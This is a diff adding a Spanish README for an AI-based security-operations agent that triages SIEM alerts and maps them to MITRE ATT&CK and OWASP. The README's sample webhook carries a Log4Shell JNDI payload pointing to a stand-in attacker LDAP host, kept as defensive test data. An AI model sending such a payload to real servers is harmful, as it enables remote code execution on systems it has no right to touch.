@@ -1,0 +1,87 @@
+# Agente SOC impulsado por IA 🛡️🧠
+
+Un Agente de Inteligencia Artificial diseñado para actuar como Analista de Nivel 2/Nivel 3 (L2/L3) de un Centro de Operaciones de Seguridad (SOC). Su misión principal es ingerir logs crudos y alertas de un SIEM (Security Information and Event Management) y determinar con alta precisión técnica si constituyen una vulnerabilidad, un ataque real o un falso positivo.
+
+## Características Principales
+
+Este agente toma decisiones basadas en heurística y orquestación con LLMs, utilizando herramientas integradas para enriquecer el contexto del evento:
+
+- **Clasificador Táctico MITRE ATT&CK**: Mapea cadenas de ataque a las 14 tácticas Enterprise oficiales de MITRE, identificando la fase exacta de la *Kill Chain* (ej. Búsqueda de Credenciales, Movimiento Lateral, Evasión de Defensas).
+- **Analista de Patrones Web (OWASP Top 10 2025)**: Escanea payloads en bruto buscando firmas de Inyecciones (SQL/OS), Deserialización Insegura, Path Traversal, entre otros.
+- **Consultor de Vulnerabilidades (CVSS v4.0)**: Evaluación precisa de severidad técnica utilizando un registro de CVEs relevantes.
+- **Inteligencia de Amenazas**: Verifica la reputación de direcciones IP para identificar Actores de Amenazas (Threat Actors) conocidos.
+- **Reportes Estructurados**: Devuelve un resumen ejecutivo JSON listo para ser consumido por analistas humanos o integrarse de vuelta en un SOAR/SIEM, indicando *Qué ocurrió*, *Sus implicancias* y su *Relación con MITRE/OWASP*.
+
+## Tecnologías Utilizadas
+
+- **Python 3.9+**
+- **FastAPI**: Servidor asíncrono y ultra rápido para la ingesta de webhooks desde el SIEM.
+- **LangChain**: Framework de orquestación para el razonamiento del Agente y ejecución de herramientas (*Tool Calling*).
+- **Pydantic (v2)**: Validación estricta y generación de salidas estructuradas.
+- **Modelos LLM (vía OpenRouter)**: Compatible con modelos Llama 3, Mistral, Qwen, GPT-4o, etc.
+
+---
+
+## 🚀 Implementación y Uso
+
+### 1. Clonar el repositorio
+```bash
+git clone https://github.com/asistenteainikola/AgenteSOC.git
+cd AgenteSOC
+```
+
+### 2. Entorno Virtual y Dependencias
+Crea un entorno virtual e instala los requerimientos básicos.
+```bash
+python3 -m venv venv
+source venv/bin/activate
+pip install fastapi uvicorn langchain langchain-openai pydantic
+```
+
+### 3. Configuración de Variables de Entorno
+Crea un archivo `.env` en la raíz del proyecto y configura tu proveedor (ej. OpenRouter o OpenAI):
+```env
+OPENAI_API_KEY=tu_clave_api_aqui
+OPENAI_API_BASE=https://openrouter.ai/api/v1
+LLM_MODEL=meta-llama/llama-3.1-8b-instruct:free
+LLM_TEMPERATURE=0.0
+```
+> **Nota:** Se recomienda un modelo con alta capacidad de *Tool Calling* y *Structured Output* (ej. Llama 3.1 8B, GPT-4o-mini, o Mistral).
+
+### 4. Levantar el Servidor
+```bash
+uvicorn main:app --reload
+```
+El agente se levantará escuchando en `http://localhost:8000`.
+
+---
+
+## 🧪 Pruebas de Funcionamiento (Simulación SIEM)
+
+Puedes probar la capacidad del Agente enviándole un webhook estructurado que simula una alerta enviada por un Firewall, WAF o Endpoint. Usa el siguiente comando en otra terminal:
+
+**Ejemplo de Alerta: Intento de Explotación Log4Shell (Crítica)**
+```bash
+curl -X 'POST' 'http://localhost:8000/api/v1/webhook/analyze' \
+-H 'Content-Type: application/json' \
+-d '{
+  "event_id": "PANW-THREAT-998241",
+  "source": "PaloAlto-NGFW-Core",
+  "timestamp": "2026-03-24T22:15:33Z",
+  "event_type": "THREAT",
+  "severity": "CRITICAL",
+  "payload": {
+      "victim_ip": "10.150.2.45",
+      "attacker_ip": "198.51.100.42",
+      "threat_name": "Apache-Log4j-JNDI-Code-Injection",
+      "app": "web-browsing",
+      "raw_log": "GET /login HTTP/1.1\r\nHost: 10.150.2.45\r\nUser-Agent: ${jndi:ldap://198.51.100.42:1389/Exploit}\r\n",
+      "cve": "CVE-2021-44228"
+  }
+}'
+```
+
+El Agente evaluará el evento, buscará el CVE, analizará la IP, mapeará la técnica a MITRE ATT&CK, y devolverá un diagnóstico estructurado.
+
+---
+*Desarrollado para potenciar la respuesta automatizada frente a incidentes cibernéticos.*
